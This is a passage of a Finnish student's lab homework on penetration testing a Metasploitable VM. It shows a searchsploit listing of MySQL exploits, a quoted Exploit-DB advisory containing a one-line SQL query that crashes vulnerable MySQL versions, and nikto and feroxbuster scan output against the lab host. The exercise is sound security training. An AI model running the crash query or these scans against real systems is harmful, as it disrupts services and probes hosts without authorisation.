Advanced Poll 2.0 - 'mysql_host' Cross-Sit | php/webapps/33972.txt
Agora 1.4 RC1 - 'MysqlfinderAdmin.php' Rem | php/webapps/2726.txt
Asterisk 'asterisk-addons' 1.2.7/1.4.3 - C | linux/remote/30677.pl
Banex PHP MySQL Banner Exchange 2.21 - 'ad | php/webapps/28307.txt
Banex PHP MySQL Banner Exchange 2.21 - 'me | php/webapps/28308.txt
Banex PHP MySQL Banner Exchange 2.21 - 'si | php/webapps/28306.txt
Cholod MySQL Based Message Board - 'Mb.cgi | cgi/webapps/27464.txt
Cisco Firepower Threat Management Console  | linux/local/40465.txt
CMSQLite / CMySQLite 1.3 - Cross-Site Requ | php/webapps/14096.html
CMSQLite 1.2 / CMySQLite 1.3.1 - Remote Co | php/webapps/14654.php
cPanel 10.8.x - 'cpwrap' via MySQLAdmin Pr | php/webapps/2554.php
cPanel 10.8.x - cpwrap via MySQLAdmin Priv | linux/local/2466.pl
cPanel 11 - PassWDMySQL Cross-Site Scripti | php/webapps/29572.txt
CSP MySQL User Manager 2.3.1 - Authenticat | linux/webapps/44589.txt
Froxlor Server Management Panel 0.9.33.1 - | php/webapps/37725.txt
GEDCOM_TO_MYSQL - '/PHP/index.php?nom_bran | php/webapps/31731.txt
GEDCOM_TO_MYSQL - '/PHP/info.php' Multiple | php/webapps/31732.txt
GEDCOM_TO_MYSQL - '/PHP/prenom.php' Multip | php/webapps/31730.txt
JSPMySQL Administrador - Multiple Vulnerab | jsp/webapps/38098.txt
KBVault MySQL 0.16a - Arbitrary File Uploa | aspx/webapps/42184.txt
Keld PHP-MySQL News Script 0.7.1 - 'login. | php/webapps/32143.txt
Linkster - PHP/MySQL SQL Injection         | php/webapps/10450.txt
miniMySQLAdmin 1.1.3 - Cross-Site Request  | php/webapps/39912.html
MyBlog: PHP and MySQL Blog/CMS software -  | php/webapps/3685.txt
MyBlog: PHP and MySQL Blog/CMS software -  | php/webapps/5913.txt
MySQL (Linux) - Database Privilege Escalat | linux/local/23077.pl
MySQL (Linux) - Heap Overrun (PoC)         | linux/dos/23076.pl
MySQL (Linux) - Stack Buffer Overrun (PoC) | linux/dos/23075.pl
MySQL - 'Stuxnet Technique' Windows Remote | windows/remote/23083.txt
MySQL - Authentication Bypass              | multiple/remote/19092.py
MySQL - Denial of Service (PoC)            | linux/dos/23078.txt
MySQL - Remote User Enumeration            | multiple/remote/23081.pl
MySQL - yaSSL CertDecoder::GetName Buffer  | linux/remote/16850.rb
MySQL / MariaDB - Geometry Query Denial of | linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/ | linux/local/40360.py
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5. | linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5. | linux/local/40679.sh
MySQL 3.20.32 a/3.23.34 - Root Operation S | unix/local/20718.txt
MySQL 3.20.32/3.22.x/3.23.x - Null Root Pa | linux/remote/21725.c
MySQL 3.20.32/3.22.x/3.23.x - Null Root Pa | linux/remote/21726.c
MySQL 3.22.27/3.22.29/3.23.8 - GRANT Globa | multiple/local/19721.txt
Mysql 3.22.x/3.23.x - Local Buffer Overflo | linux/local/20581.c
MySQL 3.23.x - 'mysqld' Local Privilege Es | linux/local/22340.txt
MySQL 3.23.x/4.0.x - 'COM_CHANGE_USER' Pas | unix/remote/22084.c
MySQL 3.23.x/4.0.x - COM_CHANGE_USER Passw | unix/remote/22085.txt
MySQL 3.23.x/4.0.x - Password Handler Buff | linux/dos/23138.txt
MySQL 3.23.x/4.0.x - Remote Buffer Overflo | linux/remote/98.c
MySQL 3.x/4.0.x - Weak Password Encryption | linux/local/22565.c
MySQL 3.x/4.x - ALTER TABLE/RENAME Forces  | linux/remote/24669.txt
MySQL 4.0.17 (Linux) - User-Defined Functi | linux/local/1181.c
MySQL 4.1.18/5.0.20 - Local/Remote Informa | linux/remote/1742.c
MySQL 4.1/5.0 - Authentication Bypass      | multiple/remote/24250.pl
MySQL 4.1/5.0 - Zero-Length Password Authe | multiple/remote/311.pl
MySQL 4.x - CREATE FUNCTION Arbitrary libc | multiple/remote/25209.pl
MySQL 4.x - CREATE FUNCTION mysql.func Tab | multiple/remote/25210.php
MySQL 4.x - CREATE Temporary TABLE Symlink | multiple/remote/25211.c
MySQL 4.x/5.0 (Linux) - User-Defined Funct | linux/local/1518.c
MySQL 4.x/5.0 (Windows) - User-Defined Fun | windows/remote/3274.txt
MySQL 4.x/5.x - Server Date_Format Denial  | linux/dos/28234.txt
MySQL 4/5 - SUID Routine Miscalculation Ar | linux/remote/28398.txt
MySQL 4/5/6 - UDF for Command Execution    | linux/local/7856.txt
MySQL 5 - Command Line Client HTML Special | linux/remote/32445.txt
MySQL 5.0.18 - Query Logging Bypass        | linux/remote/27326.txt
MySQL 5.0.20 - COM_TABLE_DUMP Memory Leak/ | linux/remote/1741.c
MySQL 5.0.45 - 'Alter' Denial of Service   | multiple/dos/4615.txt
MySQL 5.0.45 - (Authenticated) COM_CREATE_ | multiple/dos/9085.txt
MySQL 5.0.75 - 'sql_parse.cc' Multiple For | linux/dos/33077.c
MySQL 5.0.x - IF Query Handling Remote Den | linux/dos/30020.txt
MySQL 5.0.x - Single Row SubSelect Remote  | linux/dos/29724.txt
MySQL 5.1.13 - INFORMATION_SCHEMA Remote D | linux/dos/31444.txt
MySQL 5.1.23 - Server InnoDB CONVERT_SEARC | linux/dos/30744.txt
MySQL 5.1.48 - 'EXPLAIN' Denial of Service | linux/dos/34506.txt
MySQL 5.1.48 - 'Temporary InnoDB' Tables D | php/dos/34505.txt
MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' R | windows/remote/23073.txt
MySQL 5.5.45 (x64) - Local Credentials Dis | windows_x86-64/local/40337.py
MySQL 5.5.45 - procedure analyse Function  | multiple/dos/39867.py
MySQL 5.5.8 - Remote Denial of Service     | windows/dos/18269.py
MySQL 6.0 yaSSL 1.7.5 - Hello Message Buff | linux/remote/9953.rb
MySQL 6.0.4 - Empty Binary String Literal  | linux/dos/32348.txt
MySQL 6.0.9 - 'GeomFromWKB()' Function Fir | linux/dos/33398.txt
MySQL 6.0.9 - SELECT Statement WHERE Claus | linux/dos/33397.txt
MySQL 6.0.9 - XPath Expression Remote Deni | linux/dos/32838.txt
MySQL < 5.6.35 / < 5.7.17 - Integer Overfl | multiple/dos/41954.py
MySQL AB Eventum 1.x - 'get_jsrs_data.php? | php/webapps/26058.txt
MySQL AB Eventum 1.x - 'list.php?release'  | php/webapps/26057.txt
MySQL AB Eventum 1.x - 'view.php?id' Cross | php/webapps/26056.txt
MySQL AB ODBC Driver 3.51 - Plain Text Pas | windows/local/22946.txt
MySQL Blob Uploader 1.7 - 'download.php' S | php/webapps/44709.txt
MySQL Blob Uploader 1.7 - 'home-file-edit. | php/webapps/44710.txt
MySQL Blob Uploader 1.7 - 'home-filet-edit | php/webapps/44711.txt
MySQL Blob Uploader 1.7 - 'home-filet-edit | php/webapps/44712.txt
MySQL Commander 2.7 - 'home' Remote File I | php/webapps/3468.txt
MySQL Edit Table 1.0 - 'id' SQL Injection  | php/webapps/45639.txt
MySQL Eventum 1.5.5 - 'login.php' SQL Inje | php/webapps/1134.pl
MySQL File Uploader 1.0 - 'id' SQL Injecti | php/webapps/41267.txt
MySQL MaxDB 7.5 - WAHTTP Server Remote Den | multiple/dos/24805.txt
MySQL MaxDB Webtool 7.5.00.23 - Remote Sta | windows/remote/960.c
MySQL Quick Admin 1.5.5 - 'cookie' Local F | php/webapps/6641.txt
MySQL Quick Admin 1.5.5 - Local File Inclu | php/webapps/7020.txt
MySQL Server 4/5 - Str_To_Date Remote Deni | linux/dos/28026.txt
MySQL Smart Reports 1.0 - 'id' SQL Injecti | php/webapps/44708.txt
MySQL Squid Access Report 2.1.4 - HTML Inj | php/webapps/20055.txt
MySQL Squid Access Report 2.1.4 - SQL Inje | php/webapps/44483.txt
MySQL User-Defined (Linux) (x86) - 'sys_ex | linux_x86/local/46249.py
MySQL User-Defined (Linux) x32 / x86_64 -  | linux/local/50236.py
MySQL yaSSL (Linux) - SSL Hello Message Bu | linux/remote/16849.rb
MySQL yaSSL (Windows) - SSL Hello Message  | windows/remote/16701.rb
MySQLDriverCS 4.0.1 - SQL Injection        | multiple/remote/35892.txt
MySQLDumper 1.21 - 'sql.php' Cross-Site Sc | php/webapps/28783.txt
MySQLDumper 1.24.4 - 'filemanagement.php?f | php/webapps/37129.txt
MySQLDumper 1.24.4 - 'index.php?page' Cros | php/webapps/37133.txt
MySQLDumper 1.24.4 - 'install.php' Multipl | php/webapps/37127.txt
MySQLDumper 1.24.4 - 'install.php?language | perl/webapps/37126.txt
MySQLDumper 1.24.4 - 'main.php' Multiple C | php/webapps/37131.txt
MySQLDumper 1.24.4 - 'menu.php' PHP Remote | php/webapps/37134.php
MySQLDumper 1.24.4 - 'restore.php?Filename | php/webapps/37125.txt
MySQLDumper 1.24.4 - 'sql.php' Multiple Cr | php/webapps/37128.txt
MySQLDumper 1.24.4 - Multiple Script Direc | php/webapps/37130.txt
MySQLNewsEngine - 'Affichearticles.php3' R | php/webapps/29569.txt
Online Doctor Appointment Booking System P | php/webapps/49059.txt
Oracle MySQL (Windows) - FILE Privilege Ab | windows/remote/35777.rb
Oracle MySQL (Windows) - MOF Execution (Me | windows/remote/23179.rb
Oracle MySQL - 'ALTER DATABASE' Remote Den | multiple/dos/14537.txt
Oracle MySQL / MariaDB - Insecure Salt Gen | linux/remote/38109.pl
Oracle MySQL 5.1.48 - 'HANDLER' Interface  | linux/dos/34520.txt
Oracle MySQL < 5.1.49 - 'DDL' Statements D | linux/dos/34522.txt
Oracle MySQL < 5.1.49 - 'WITH ROLLUP' Deni | multiple/dos/15467.txt
Oracle MySQL < 5.1.49 - Malformed 'BINLOG' | linux/dos/34521.txt
Oracle MySQL < 5.1.50 - Privilege Escalati | multiple/remote/34796.txt
Oracle MySQL for Microsoft Windows - Paylo | windows/remote/16957.rb
OraclMySQL 5.1.48 - 'LOAD DATA INFILE' Den | linux/dos/34510.txt
paBugs 2.0 Beta 3 - 'class.mysql.php' Remo | php/webapps/2437.php
PHP 4.4.0 - 'mysql_connect function' Local | windows/local/1406.php
PHP 4.4.7/5.2.3 - MySQL/MySQLi 'Safe_Mode' | multiple/local/4392.txt
PHP 4.x/5.x MySQL Library - 'Safe_mode' Fi | php/remote/21264.php
PHP 4.x/5.x MySQL Library - 'Safe_mode' Fi | php/remote/21265.php
PHP 4.x/5.x MySQL Library - 'Safe_mode' Fi | php/remote/21266.php
PHP-MySQL-Quiz - SQL Injection             | php/webapps/10876.txt
PHP-Nuke 8.0 Final - 'INSERT' Blind SQL In | php/webapps/3344.pl
PHP-Nuke Module Eve-Nuke 0.1 - 'mysql.php' | php/webapps/3591.txt
PHP/Mysql Site Builder 0.0.2 - 'htm2PHP.ph | php/webapps/2969.txt
PHPwebnews 0.2 MySQL Edition - 'det' SQL I | php/webapps/5999.txt
PHPwebnews 0.2 MySQL Edition - 'id_kat' SQ | php/webapps/5998.txt
PHPwebnews 0.2 MySQL Edition - 'SQL' Insec | php/webapps/6136.txt
Plixer Scrutinizer NetFlow and sFlow Analy | windows/remote/20355.rb
Point of Sales (POS) in VB.Net MySQL Datab | php/webapps/45721.txt
ProFTPd - 'mod_mysql' Authentication Bypas | multiple/remote/8037.txt
PromoteWeb MySQL - 'id' SQL Injection      | php/webapps/6577.txt
Robert Zimmerman PHP / MySQL Scripts - Aut | php/webapps/10260.txt
Symantec Web Gateway 5.0.3.18 - Blind SQL  | php/webapps/20044.txt
waldronmatt FullCalendar-BS4-PHP-MySQL-JSO | php/webapps/47546.txt
waldronmatt FullCalendar-BS4-PHP-MySQL-JSO | php/webapps/47548.txt
Woltlab Burning Board 2.3.4 - 'Class_DB_My | php/webapps/27444.txt
WordPress Plugin Google Document Embedder  | php/webapps/35447.txt
Zabbix Agent 3.0.1 - 'mysql.size' Shell Co | linux/local/39769.txt
Zend Framework 1.11.4 - 'PDO_MySql' Securi | linux/remote/35784.php
ZoomStats 1.0.2 - 'mysql.php' Remote File  | php/webapps/2420.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Sieltähän löytyi tavaraa! [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit) löytyi searchsploitin käyttöön lisäohjeita (man-sivujen lisäksi). `-p`-lipun avulla löysin exploitdb:n sisältöjen löytyvän hakemiston `/usr/share/exploitdb/exploits/` alta. Hain satunnaisesti valitun exploitin, joka näytti osuvan Metasploitablen käyttämään versioon, MySQL 5.0.x - IF Query Handling Remote Den | linux/dos/30020.txt

```

┌──(susi㉿isopaha)-[~]
└─$ cat /usr/share/exploitdb/exploits/linux/dos/30020.txt 
source: https://www.securityfocus.com/bid/23911/info

MySQL is prone to a remote denial-of-service vulnerability because it fails to handle certain specially crafted queries.

An attacker can exploit this issue to crash the application, denying access to legitimate users.

NOTE: An attacker must be able to execute arbitrary SELECT statements against the database to exploit this issue. This may be through legitimate means or by exploiting other latent SQL-injection vulnerabilities.

Versions prior to MySQL 5.0.40 are vulnerable.

SELECT id from example WHERE id IN(1, (SELECT IF(1=0,1,2/0)));         


```

Tämä hyökkäys näyttää olevan lähinnä kiusantekoon soveltuva haavoittuvuus (se kaataa applikaation, joten sille on vaikeaa tehdä toimia hyökkääjänkään puolesta).

#### j\) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)

Ajoin nikton ja annoin `-host` kohtaan kohdekoneen osoitteen. Lipun -host sain syöttämällä Kali Linuxissa pelkästään komennon `nikto`, se tulee siihen esiasennettuna.


```

┌──(susi㉿isopaha)-[~]
└─$ nikto -host 192.168.66.3
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.66.3
+ Target Hostname:    192.168.66.3
+ Target Port:        80
+ Start Time:         2023-11-12 02:55:53 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /doc/: Directory indexing found.
+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 19:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /test/: Directory indexing found.
+ /test/: This might be interesting.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /phpMyAdmin/: phpMyAdmin directory found.
+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-11-12 02:56:14 (GMT2) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


```

Nähtävästi nikto pureutui annetuilla parametreilla Metasploitablen Apache-palvelimeen. Se antoi aika mukavasti tekstinä erilaista tietoa sivuston haavoittuvuuksista, sekä mistä löytää niihin liittyvää lisätietoa, kuten "+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials."

#### k\) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.

Otin verkkoyhteyden pois sisäverkosta ja avasin toisen verkkoliittimen ulkoverkkoon.

Asensin läpikävelyssä käytetyn [feroxbuster](https://github.com/epi052/feroxbuster):in: `sudo apt-get install feroxbuster`

Asennuksen jälkeen suljin ulkoverkkoyhteyden ja otin takaisin sisäverkkoyhteyden. Ajoin komennon `feroxbuster --url http://192.168.66.3/` Skannauksessa meni ehkä viitisen minuuttia. Saattoi olla virhe ajaa komento ilman filttereitä tai muita säätöjä tälläiseen kohteeseen

Kyseessä lienee ffuf:in kaltainen fuzzaustyökalu (kuten nimestä saattaa päätellä)

```
┌──(susi㉿isopaha)-[~]
└─$ feroxbuster --url http://192.168.66.3/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.66.3/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       31w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       29l      123w      891c http://192.168.66.3/index
301      GET        9l       29w      322c http://192.168.66.3/phpMyAdmin => http://192.168.66.3/phpMyAdmin/
404      GET        9l       34w      293c http://192.168.66.3/Reports%20List
301      GET        9l       29w      316c http://192.168.66.3/test => http://192.168.66.3/test/
[>-------------------] - 2s      2499/90007   67s     found:4       errors:1      
[>-------------------] - 2s      2499/90007   67s     found:4       errors:1      
[>-------------------] - 2s      2499/90007   67s     found:4       errors:1      
[>-------------------] - 2s      2518/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2561/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2597/60009   44s     found:4       errors:1      
[>-------------------] - 2s      2652/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2712/60009   44s     found:4       errors:1      
[>-------------------] - 2s      2761/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2819/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2890/60009   42s     found:4       errors:1      
[>-------------------] - 2s      2909/60009   42s     found:4       errors:1      
[>-------------------] - 2s      2931/60009   43s     found:4       errors:1      
[>-------------------] - 2s      2993/60009   44s     found:4       errors:1      
301      GET        9l       29w      317c http://192.168.66.3/twiki => http://192.168.66.3/twiki/
[>-------------------] - 2s      3002/90009   65s     found:4       errors:1      
[>-------------------] - 2s      3002/90009   65s     found:4       errors:1      
[>-------------------] - 2s      3012/90009   65s     found:5       errors:1      
[>-------------------] - 2s      3065/90009   67s     found:5       errors:1      
[>-------------------] - 2s      3073/90009   67s     found:5       errors:1      
[>-------------------] - 2s      3111/90009   65s     found:5       errors:1      
[>-------------------] - 2s      3111/90009   65s     found:5       errors:1      
[>-------------------] - 2s      3125/90009   65s     found:5       errors:1      
[>-------------------] - 2s      3160/90009   66s     found:5       errors:1      
[>-------------------] - 2s      3199/90009   67s     found:5       errors:1      
[>-------------------] - 3s      3264/90009   65s     found:5       errors:1      
[>-------------------] - 3s      3321/90009   67s     found:5       errors:1      
[>-------------------] - 3s      3374/90009   65s     found:5       errors:1      
[>-------------------] - 3s      3406/90009   65s     found:5       errors:1      
[>-------------------] - 3s      3409/90009   66s     found:5       errors:1      
[>-------------------] - 3s      3435/90009   66s     found:5       errors:1      
404      GET        9l       34w      294c http://192.168.66.3/Style%20Library

...

```

Dataa tulostui näin lähemmäs tuhansia rivejä.

![](img/8.png)

Jätän tämän työkalun tarkemman käytön myöhemmälle, jos ffuf ei tuota haluttuja tuloksia. Ainakin mainostuksen perusteella tämä toimii hyvin rekursiivisiin hakuihin.